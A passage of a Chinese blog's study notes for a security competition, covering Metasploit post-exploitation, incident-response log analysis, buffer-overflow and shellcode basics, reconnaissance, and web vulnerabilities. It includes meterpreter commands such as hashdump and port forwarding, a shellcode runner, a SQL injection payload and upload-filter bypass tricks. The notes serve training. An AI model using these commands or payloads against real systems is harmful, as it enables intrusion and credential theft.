端代理工具</h3>\n<h4 id=\"proxifier\"><a class=\"anchor\" href=\"#proxifier\">#</a> Proxifier</h4>\n<h4 id=\"cknife\"><a class=\"anchor\" href=\"#cknife\">#</a> Cknife</h4>\n<h2 id=\"merasploit\"><a class=\"anchor\" href=\"#merasploit\">#</a> Merasploit</h2>\n<ul>\n<li>集成渗透测试框架</li>\n<li>meterpreter\n<ul>\n<li>migrate 迁移进程</li>\n<li>hashdump 收集用户 hash</li>\n<li>ipconfig 查询网卡信息</li>\n<li>run getgui -e 开启 33889 远程桌面端口</li>\n<li>run autoroute -s 网段 添加后，可以将代理架设出来\n<ul>\n<li>use auxiliary/server/socks_proxy 默认监听本地的 1080 端口 (使用的是 socks5)</li>\n<li>使用 run 之后，代理便架设了，然后使用 proxychains 就可以使用</li>\n</ul>\n</li>\n<li>内网扫描\n<ul>\n<li>use auxiliary/scanner/portscan/tcp</li>\n</ul>\n</li>\n<li>端口转发\n<ul>\n<li>portfwd add -l 7777 -p 80 (目标机) -r ip (目标机)</li>\n</ul>\n</li>\n<li>使用代理\n<ul>\n<li>set proxies socks5: 代理的 IP</li>\n<li>设置代理之后不能设置 reverse 类型的 payload，可以设置 set payload windows/x64/meterpreter/bind_tcp</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"212-铁三-数据分析赛\"><a class=\"anchor\" href=\"#212-铁三-数据分析赛\">#</a> 2.12 铁三 - 数据分析赛</h1>\n<p>可能题目：</p>\n<ul>\n<li>\n<p>路由器或交换机的品牌或型号</p>\n</li>\n<li>\n<p>攻击方法</p>\n</li>\n<li>\n<p>时间</p>\n</li>\n<li>\n<p>执行的第 x 条命令</p>\n</li>\n<li>\n<p>爆破的次数</p>\n</li>\n<li>\n<p>敏感文件名称</p>\n</li>\n<li>\n<p>各种账号密码或密码哈希</p>\n</li>\n</ul>\n<p>相关题目的解法</p>\n<ul>\n<li>\n<p>登陆相关：admin、login、manage</p>\n</li>\n<li>\n<p>文件相关：edit、upload、modify</p>\n</li>\n<li>\n<p>用来过滤（匹配）url 中的多个关键字</p>\n<p>http.request url matches \"admin | login\"(正则表达式)</p>\n</li>\n</ul>\n<p>技巧：</p>\n<ul>\n<li>定位 ctrl+m 对数据记录进行标记，ctrl+shift+n 下一条，ctrl+shift+b 上一条</li>\n</ul>\n<h2 id=\"应急响应解析\"><a class=\"anchor\" href=\"#应急响应解析\">#</a> 应急响应解析</h2>\n<h3 id=\"准备阶段\"><a class=\"anchor\" href=\"#准备阶段\">#</a> 准备阶段</h3>\n<h4 id=\"完善监控体系\"><a class=\"anchor\" href=\"#完善监控体系\">#</a> 完善监控体系</h4>\n<p>在部署服务器时，要由系统维护人员尽可能的使用自动化脚本、监控软件对网络流量、系统资源使用率、安全事件日志实现自动统计和告警呈现。</p>\n<p>使用方法：将脚本放到 <code>crontab</code>  计划任务中，每小时自动执行。这样便会在 <code>/home/oslog/host_yyymmdd/hh</code>  目录下生成各个小时的 cpu、内存、网络、I0 的统计数据。</p>\n<h4 id=\"其他措施\"><a class=\"anchor\" href=\"#其他措施\">#</a> 其他措施</h4>\n<ol>\n<li>\n<p>制定安全预案</p>\n<p>以业务为核心，针对可能发生的安全事件之前、发生过程中以及刚刚结束之后，谁负责做什么、何时做</p>\n</li>\n<li>\n<p>安全应急演练</p>\n<p>定期进行安全演练，熟悉应急过程、防止因突发安全事件而措手不及</p>\n</li>\n<li>\n<p>建立安全初始化快照</p>\n<p>定期给服务器创建快照，防止因安全事件导致服务器重要数据丢失</p>\n</li>\n<li>\n<p>准备响应工具包</p>\n<p>再出现安全事故时不要相信服务器上的任何命令文件。无论是安全应急的检测阶段还是安全应急的根治阶段，你都需要一个响应工具包</p>\n</li>\n</ol>\n<h4 id=\"windows-响应工具包\"><a class=\"anchor\" href=\"#windows-响应工具包\">#</a> Windows 响应工具包</h4>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_1.jpg\" alt=\"\"></p>\n<h4 id=\"linux-响应工具包\"><a class=\"anchor\" href=\"#linux-响应工具包\">#</a> Linux 响应工具包</h4>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_2.jpg\" alt=\"\"></p>\n<p><strong>Linux 常见进程</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_3.jpg\" alt=\"\"></p>\n<h3 id=\"检测阶段\"><a class=\"anchor\" href=\"#检测阶段\">#</a> 检测阶段</h3>\n<ul>\n<li>\n<p>通过异常文件的创建和修改时间，一般可以判断攻击者对网站进行入侵的时间段；</p>\n</li>\n<li>\n<p>对异常服务或进程的追踪，可以查找恶意文件，确认攻击后的后门，以及攻击时间；</p>\n</li>\n<li>\n<p>网站目录下的异常文件，对判断攻击手段具有参考意义；</p>\n</li>\n<li>\n<p>网站访问日志可以对攻击手段、时间和攻击源地址的追踪提供有力的证据。</p>\n</li>\n<li>\n<p>系统安全日志中的登录信息同样可以用于判断攻击者来源。</p>\n</li>\n</ul>\n<p><strong>Linux 检查点</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_4.jpg\" alt=\"\"></p>\n<p><strong>Linxu 应急命令</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_5.jpg\" alt=\"\"></p>\n<p>其中查找 s 权限位的命令应为 <code>find / -type f -perm -04000</code></p>\n<p><strong>Linxu 使用应急命令</strong></p>\n<ul>\n<li>\n<p>在 apachelog 中找出访问次数最多的 10 个 IP。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'{print $1}'</span> apache_ log <span class=\"token operator\">|</span><span class=\"token function\">sort</span> <span class=\"token operator\">|</span><span class=\"token function\">uniq</span> -c<span class=\"token operator\">|</span><span class=\"token function\">sort</span> -nr<span class=\"token operator\">|</span><span class=\"token function\">head</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">10</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>在 apache 日志中找出访问次数最多的几个分钟。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'{print $4}'</span> access_ log <span class=\"token operator\">|</span><span class=\"token function\">cut</span> <span class=\"token parameter variable\">-C</span> <span class=\"token number\">14</span>-18<span class=\"token operator\">|</span><span class=\"token function\">sort</span><span class=\"token operator\">|</span><span class=\"token function\">uniq</span> -c<span class=\"token operator\">|</span><span class=\"token function\">sort</span> -nr<span class=\"token operator\">|</span><span class=\"token function\">head</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>假设我们定位到某个可疑 ip 访问次数较多，那么我们可以从系统日志中进行查询该 ip 的具体行为:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> access_ _log <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token number\">220.181</span>.38.183 <span class=\"token operator\">|</span> <span class=\"token function\">less</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>假设发现问题文件，但不允许被删除:</p>\n<p>先使用 <code>lsattr</code>  查看文件属性 (i)， 去掉 i 属性 <code>chattr -i filename</code></p>\n</li>\n</ul>\n<h3 id=\"抑制根除阶段\"><a class=\"anchor\" href=\"#抑制根除阶段\">#</a> 抑制根除阶段</h3>\n<h3 id=\"恢复阶段\"><a class=\"anchor\" href=\"#恢复阶段\">#</a> 恢复阶段</h3>\n<h3 id=\"跟进阶段\"><a class=\"anchor\" href=\"#跟进阶段\">#</a> 跟进阶段</h3>\n<h1 id=\"214-真题解析之缓冲区溢出基础及样题解析\"><a class=\"anchor\" href=\"#214-真题解析之缓冲区溢出基础及样题解析\">#</a> 2.14 真题解析之缓冲区溢出基础及样题解析</h1>\n<h2 id=\"环境准备\"><a class=\"anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<ul>\n<li>\n<p>Ubuntu 16.04 64bit</p>\n</li>\n<li>\n<p>sudo apt-get install binutils nasm nmap gcc</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L0FJUzMtMjAxNy9ibG9iL21hc3Rlci9lbnZfc2V0dXAuc2g=\">https://github.com/scwuaptx/AIS3-2017/blob/master/env_setup.sh</span></p>\n</li>\n<li>\n<p>sudo echo \"set disassembly-flavor intel\"&gt; ~/.gdbinit</p>\n</li>\n</ul>\n<h2 id=\"相关知识\"><a class=\"anchor\" href=\"#相关知识\">#</a> 相关知识</h2>\n<ul>\n<li>\n<p>汇编、C、python</p>\n</li>\n<li>\n<p>Linux、gdb、gcc、objdump、IDApro</p>\n</li>\n<li>\n<p>听说过 shellcode、stack overflow 、NX、ROP、pwntools</p>\n</li>\n</ul>\n<h2 id=\"pwn-简介\"><a class=\"anchor\" href=\"#pwn-简介\">#</a> Pwn 简介</h2>\n<h3 id=\"产生漏洞原因\"><a class=\"anchor\" href=\"#产生漏洞原因\">#</a> 产生漏洞原因：</h3>\n<ul>\n<li>\n<p>CPU 和内存之间交换数据和指令</p>\n</li>\n<li>\n<p>数据和指令之间并不能完全的区分开来</p>\n</li>\n</ul>\n<h3 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h3>\n<p>漏洞 --&gt; 控制流劫持</p>\n<ul>\n<li>\n<p>利用漏洞达成攻击者的目的</p>\n</li>\n<li>\n<p>主要取得程序的控制权</p>\n</li>\n<li>\n<p>又称 PWN</p>\n</li>\n</ul>\n<h3 id=\"常用工具\"><a class=\"anchor\" href=\"#常用工具\">#</a> 常用工具</h3>\n<ul>\n<li>IDA pro</li>\n</ul>\n<ul>\n<li>\n<p>gdb 动态分析工具</p>\n<ul>\n<li>\n<p>基本命令</p>\n<ul>\n<li>程序运行\n<ul>\n<li>run</li>\n<li>continue</li>\n<li>si (step into) 步入</li>\n<li>ni (next instruction) 下一个指令</li>\n</ul>\n</li>\n<li>断点\n<ul>\n<li>break *0x400566</li>\n<li>into breakpoint</li>\n<li>delete 1 删除断点</li>\n</ul>\n</li>\n<li>查看信息\n<ul>\n<li>x/wx 0x400526</li>\n<li>disas main 反汇编</li>\n<li>info registers</li>\n<li>backtrace 栈回溯</li>\n</ul>\n</li>\n<li>attach pid 连接到某个进程上调试</li>\n<li>set *address=value 设置某地址的值</li>\n</ul>\n</li>\n<li>\n<p>GDB - peda</p>\n<ul>\n<li>Python Exploit Development Assistance for GDB</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh\">https://github.com/longld/peda</span></li>\n<li>功能\n<ul>\n<li>checksec：查看保护机制</li>\n<li>elfsymbol：查看程序使用的函数 plt 地址</li>\n<li>vmmap：查看内存映射</li>\n<li>find/searchmem：在内存中查找特定的字符串</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>pwntools</p>\n<ul>\n<li>基于 python 的 exploit 编写库</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B3bnRvb2xzLnJlYWR0aGVkb2NzLmlv\">http://pwntools.readthedocs.io</span></li>\n<li>启动程序\n<ul>\n<li>io = process(\"./binary\")</li>\n<li>io = process([\"./bin\"].env={\"LD_PRELOAD\":\"./libc-2.23.so\"})</li>\n<li>io = remote(\"127.0.0.1\",50001)</li>\n<li>ncat -ve ./bof -kl 50001 (其中 bof 为文件)</li>\n</ul>\n</li>\n<li>交互\n<ul>\n<li>io.send()/sendline()</li>\n<li>io.recv()/recvline()/recvutil()</li>\n<li>sendafter(\"\",\"\")</li>\n<li>io.interactive()</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>ELF / 汇编</p>\n<ul>\n<li>section\n<ul>\n<li>文件格式\n<ul>\n<li>Linux -- ELF</li>\n<li>Windows -- PE</li>\n</ul>\n</li>\n<li>.bss 存放未初始化的全局变量</li>\n<li>.data 存放已经初始化的全局变量</li>\n<li>.text 存放程序执行代码</li>\n<li>.rodata 存放只读程序</li>\n</ul>\n</li>\n<li>系统调用</li>\n<li>32 位利用栈</li>\n<li>64 位利用寄存器</li>\n<li>系统调用号：RAX</li>\n<li>参数：RDI RSI RDX RCX R8 R9</li>\n<li>返回值：RAX</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeXNjYWxscy53M2NoYWxscy5jb20vP2FyY2g9eDg2XzY0\">记录的一些系统调用</span></li>\n</ul>\n</li>\n<li>\n<p>shellcode: 将要在受害软件上执行的恶意代码</p>\n<ul>\n<li>\n<p>作用：启动 shell</p>\n</li>\n<li>\n<p>nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序</p>\n</li>\n<li>\n<p>Id -s -o shasm shasm.o 链接目标文件</p>\n</li>\n<li>\n<p>objcopy -O binary shasm.o code 提取其中的 shellcode 部分</p>\n</li>\n<li>\n<p>xxd code 显示方便</p>\n</li>\n<li>\n<p>一个接收 shellcode 的程序，func.c</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>shellcode<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>shellcode<span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>fptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">fptr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>编译  <code>gcc func.c -zexecstack -o func</code></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>ncat -ve ./ 文件名 -kl port</li>\n</ul>\n<h3 id=\"缓冲区溢出\"><a class=\"anchor\" href=\"#缓冲区溢出\">#</a> 缓冲区溢出</h3>\n<p>return to shellcode</p>\n<ul>\n<li>\n<p>测试偏移覆盖返回地址</p>\n<ul>\n<li>pwntools cyclic</li>\n<li>gdp-pda\n<ul>\n<li>pattern create 100 shellcode</li>\n<li>pattern offset</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>使用 pwntools 产生 shellcode</p>\n<ul>\n<li>context.arch=\"amd64\" 提前声明系统架构</li>\n<li>shcode = asm(<span class=\"exturl\" data-url=\"aHR0cDovL3NoZWxsY3JhZnQuc2g=\">shellcraft.sh</span> ()) 自动产生 shellcode</li>\n</ul>\n</li>\n<li>\n<p>编译选项</p>\n<ul>\n<li>gcc -fno-stack-protector -z execstack bof.c -o bof</li>\n</ul>\n</li>\n<li>\n<p>protection</p>\n<ul>\n<li>\n<p>ASLR</p>\n<ul>\n<li>\n<p>地址空间随机化</p>\n</li>\n<li>\n<p>堆、栈、共享库每次运行的位置都随机变化</p>\n</li>\n<li>\n<p>查看是否开启 cat/proc/sys/kernel/randomize_va_space</p>\n</li>\n<li>\n<p>ldd 查看地址</p>\n</li>\n</ul>\n</li>\n<li>\n<p>DEP (数据执行保护) 又称为 NX</p>\n<ul>\n<li>gcc 编译默认开启 使用 -z execstack 取消 NX 保护</li>\n</ul>\n</li>\n<li>\n<p>PIE</p>\n<ul>\n<li>\n<p>位置独立的可执行区域</p>\n</li>\n<li>\n<p>gcc 默认不开启，-fPIC -pie 开启</p>\n</li>\n<li>\n<p>data 和 code 段跟着随机化，ret2shellcode 没有固定位置可以利用</p>\n</li>\n</ul>\n</li>\n<li>\n<p>StackGuard</p>\n<ul>\n<li>\n<p>随机生成在函数调用前将 canary 放入栈中，发现改变立即终止</p>\n</li>\n<li>\n<p>阻挡了 stack overflow 的攻击</p>\n</li>\n<li>\n<p>gcc 默认开启 -fno-stack-protector 关闭</p>\n</li>\n</ul>\n</li>\n<li>\n<p>RELRO</p>\n<ul>\n<li>\n<p>gcc -WI,-z,relro,-z now 开启 full</p>\n</li>\n<li>\n<p>disable .got.plt/.got 都可写</p>\n</li>\n<li>\n<p>Partial (default) .got 可写</p>\n</li>\n<li>\n<p>Full 加载程序前解析全部函数 got 表可以不写</p>\n</li>\n</ul>\n</li>\n<li>\n<p>Lazy binding</p>\n<ul>\n<li>\n<p>GOT 表中存放着函数真正的位置，PLT 过程链接库</p>\n</li>\n<li>\n<p>程序中会调用动态库中的函数，但不是所有都能用到，这里 ELF 采取延迟绑定的机制，等到真正调用时，才去找函数</p>\n</li>\n<li>\n<p>延迟绑定机制导致 GOT 表一般可写</p>\n</li>\n<li>\n<p>覆盖 GOT 表中地址是更改程序流程的常用手段</p>\n</li>\n<li>\n<p>保护措施 RELRO</p>\n</li>\n</ul>\n</li>\n<li>\n<p>return library</p>\n<ul>\n<li>配合信息泄露获取的 libc 地址，算出 system 等函数地址</li>\n</ul>\n</li>\n<li>\n<p>ROP</p>\n<ul>\n<li>\n<p>绕过 DEP (NX)</p>\n</li>\n<li>\n<p>由多个包含 ret 的指令片段组成又称为 gadget</p>\n</li>\n<li>\n<p>ROPgadget --binary file</p>\n</li>\n<li>\n<p>ROP chain (将多个 gadget 组合到一起连续调用多个函数)</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"真题解析之逆向知识及题目讲解\"><a class=\"anchor\" href=\"#真题解析之逆向知识及题目讲解\">#</a> 真题解析之逆向知识及题目讲解</h1>\n<h2 id=\"汇编基础\"><a class=\"anchor\" href=\"#汇编基础\">#</a> 汇编基础</h2>\n<h3 id=\"栈的概念\"><a class=\"anchor\" href=\"#栈的概念\">#</a> 栈的概念</h3>\n<h3 id=\"寄存器\"><a class=\"anchor\" href=\"#寄存器\">#</a> 寄存器</h3>\n<ul>\n<li>\n<p>通用寄存器</p>\n<ul>\n<li>\n<p>8 位 AL AH BL BH</p>\n</li>\n<li>\n<p>16 位 AX BX CX DX</p>\n</li>\n<li>\n<p>32 位 EAX EBX ECX EDX</p>\n</li>\n<li>\n<p>64 位 RAX RBX RCX RDX</p>\n</li>\n</ul>\n</li>\n<li>\n<p>指令指针寄存器：IP (指向下一条要取指的指令地址)</p>\n</li>\n<li>\n<p>基址寄存器：BP 栈底</p>\n</li>\n</ul>\n<ul>\n<li>堆栈寄存器：SP 栈顶</li>\n</ul>\n<h3 id=\"指令\"><a class=\"anchor\" href=\"#指令\">#</a> 指令</h3>\n<ul>\n<li>\n<p>MOV：数据传送指令</p>\n</li>\n<li>\n<p>CALL：1. 把当前的 IP 压入栈中，2、跳转到指定位置</p>\n</li>\n<li>\n<p>RET：用栈中所保存的数据赋值给 IP, 跳转回来</p>\n</li>\n<li>\n<p>PUSH：先减 ESP, 再把数据放进去</p>\n</li>\n<li>\n<p>POP：先把数据 POP 出，再加 ESP</p>\n</li>\n<li>\n<p>LEAVE：MOV SP，BP ; POP BP</p>\n</li>\n</ul>\n<ul>\n<li>\n<p>跳转指令</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_1.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>EFLAG 寄存器</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_2.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<p>IDA shift+F7 查看 elf 的段 (.init .init_array (存放函数执行前的要执行的函数指针))</p>\n<h1 id=\"31-信息搜集\"><a class=\"anchor\" href=\"#31-信息搜集\">#</a> 3.1 信息搜集</h1>\n<h2 id=\"服务器类型-平台-版本\"><a class=\"anchor\" href=\"#服务器类型-平台-版本\">#</a> 服务器类型、平台、版本</h2>\n<ol>\n<li>\n<p>nmap</p>\n<p>nmap 进行扫描，</p>\n<p><code>nmap -O 目标ip</code>  探测系统类型</p>\n<p><code>nmap -sV 目标ip</code>  探测服务类型</p>\n<p>-sT -sU 等</p>\n<p>状态： state open 开放，closed 关闭，filtered 被防火墙 \\IDS\\IPS 等屏蔽、无法确定的状态，unfiltered 没有被屏蔽</p>\n</li>\n<li>\n<p>owasp ZAP</p>\n</li>\n</ol>\n<h2 id=\"网站容器-iis-apache-nginx-tomcat\"><a class=\"anchor\" href=\"#网站容器-iis-apache-nginx-tomcat\">#</a> 网站容器 --IIS、Apache、nginx、tomcat</h2>\n<ol>\n<li>whatweb</li>\n<li>nmap</li>\n</ol>\n<h2 id=\"脚本类型-jsp-php-asp-aspx\"><a class=\"anchor\" href=\"#脚本类型-jsp-php-asp-aspx\">#</a> 脚本类型 --jsp、php、asp、aspx</h2>\n<ol>\n<li>根据页面</li>\n<li>dirbuster</li>\n<li>site:ip filetype:?php|jsp|asp</li>\n</ol>\n<h2 id=\"数据库类型\"><a class=\"anchor\" href=\"#数据库类型\">#</a> 数据库类型</h2>\n<p>常见搭配：php--mysql、postgresql；asp 和 aspx--access、sqlserver；jsp--mysql、oracle</p>\n<h2 id=\"cms\"><a class=\"anchor\" href=\"#cms\">#</a> CMS</h2>\n<p>常见 CMS： 织梦（Dedecms）\\Dizcuz\\phpweb\\phpcms\\ 帝国 \\ASPCMS\\WORDPRESS</p>\n<p>工具：御剑 web 指纹识别、whatweb、椰树等</p>\n<h2 id=\"waf-安全狗-安全狗的设置方式-找到绕过的方法\"><a class=\"anchor\" href=\"#waf-安全狗-安全狗的设置方式-找到绕过的方法\">#</a> waf 安全狗、安全狗的设置方式、找到绕过的方法</h2>\n<h2 id=\"网站目录后台\"><a class=\"anchor\" href=\"#网站目录后台\">#</a> 网站目录后台</h2>\n<p>后台扫描</p>\n<h2 id=\"敏感信息\"><a class=\"anchor\" href=\"#敏感信息\">#</a> 敏感信息</h2>\n<p>后台目录、安装包、上传目录、网站根目录、数据库管理接口、安全页面（install.php 二次安装绕过）、phpinfo、robots.txt</p>\n<h2 id=\"旁站和-c-站\"><a class=\"anchor\" href=\"#旁站和-c-站\">#</a> 旁站和 c 站</h2>\n<p>主站难攻击，可先去旁站找漏洞，拿到控制权</p>\n<p>namp</p>\n<h2 id=\"漏洞挖掘\"><a class=\"anchor\" href=\"#漏洞挖掘\">#</a> 漏洞挖掘</h2>\n<ul>\n<li>系统主机：Nessus</li>\n</ul>\n<ul>\n<li>web 漏洞：AVWS\\Burp、OWASP ZAP\\WPSCAN\\APPSCAN</li>\n</ul>\n<h2 id=\"常见的端口号\"><a class=\"anchor\" href=\"#常见的端口号\">#</a> 常见的端口号</h2>\n<p>21/22/69/139 文件共享端口</p>\n<p>22/23/3389 远程端口</p>\n<p>80/443/8080</p>\n<p>7001/7002 weblogic</p>\n<p>3306 mysql</p>\n<p>1443 mssql</p>\n<p>1521 oracle</p>\n<p>6379 redis</p>\n<h1 id=\"33-web-应用安全\"><a class=\"anchor\" href=\"#33-web-应用安全\">#</a> 3.3 web 应用安全</h1>\n<h2 id=\"owasp\"><a class=\"anchor\" href=\"#owasp\">#</a> owasp</h2>\n<h2 id=\"owasp-top10\"><a class=\"anchor\" href=\"#owasp-top10\">#</a> owasp top10</h2>\n<h3 id=\"sql-注入漏洞\"><a class=\"anchor\" href=\"#sql-注入漏洞\">#</a> sql 注入漏洞</h3>\n<h4 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h4>\n<h4 id=\"流程-2\"><a class=\"anchor\" href=\"#流程-2\">#</a> 流程</h4>\n<ul>\n<li>\n<p>注入点探测</p>\n<ul>\n<li>\n<p>自动探测：web 漏扫工具，AWVS、APPSCAN、openVAS、nessus、OWASP ZAP、Burpsuit</p>\n</li>\n<li>\n<p>手工方式：手工构造 payload</p>\n</li>\n</ul>\n</li>\n<li>\n<p>信息获取</p>\n<ul>\n<li>\n<p>环境信息：数据库的类型、版本、操作系统版本、用户信息</p>\n</li>\n<li>\n<p>数据库的信息：库名、表名、字段名、数据值（管理员账户密码）</p>\n</li>\n</ul>\n</li>\n<li>\n<p>获取权限</p>\n<ul>\n<li>获取操作系统权限：执行 shell、上传大马或小马</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>sqlmap</p>\n<p>整型、字符型</p>\n<p>搜索型</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%$pwd%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>当此时输入的 <code>$pwd</code>  为  <code>' or 1=1 and '%'='</code>  时，原语句变为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token string\">'%'</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>此时由于 and 的优先级最高，那么会判断其前后两条语句，即</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'%'</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>很明显为真，故绕过</p>\n<h3 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h3>\n<h3 id=\"上传漏洞\"><a class=\"anchor\" href=\"#上传漏洞\">#</a> 上传漏洞</h3>\n<h4 id=\"上传绕过\"><a class=\"anchor\" href=\"#上传绕过\">#</a> 上传绕过</h4>\n<p>客户端：js 检查</p>\n<p>服务端：</p>\n<ul>\n<li>\n<p>检查后缀</p>\n</li>\n<li>\n<p>黑名单：可解析的后缀.php、.xxx，</p>\n</li>\n<li>\n<p>上传伪静态.htaccess 点绕过 空格绕过 '::$DATA 绕过</p>\n</li>\n<li>\n<p>白名单：%00 截断、0x00 截断、MIME 绕过</p>\n</li>\n<li>\n<p>检查内容</p>\n<ul>\n<li>\n<p>文件头</p>\n</li>\n<li>\n<p>突破 getimagesize ()</p>\n</li>\n<li>\n<p>二次渲染</p>\n</li>\n</ul>\n</li>\n<li>\n<p>代码逻辑</p>\n<ul>\n<li>条件竞争</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"csrf\"><a class=\"anchor\" href=\"#csrf\">#</a> CSRF</h3>\n<h3 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h3>\n<p>服务器端请求伪造，通过漏洞访问内网获取信息</p>\n<h3 id=\"暴力破解漏洞\"><a class=\"anchor\" href=\"#暴力破解漏洞\">#</a> 暴力破解漏洞</h3>\n<p>Hydra - 九头蛇（ftp、ssh、telent、mysql 等）</p>\n<h3 id=\"文件包含漏洞\"><a class=\"anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h3>\n<h3 id=\"xxe-漏洞\"><a class=\"anchor\" href=\"#xxe-漏洞\">#</a> XXE 漏洞</h3>\n<h3 id=\"反序列化漏洞\"><a class=\"anchor\" href=\"#反序列化漏洞\">#</a> 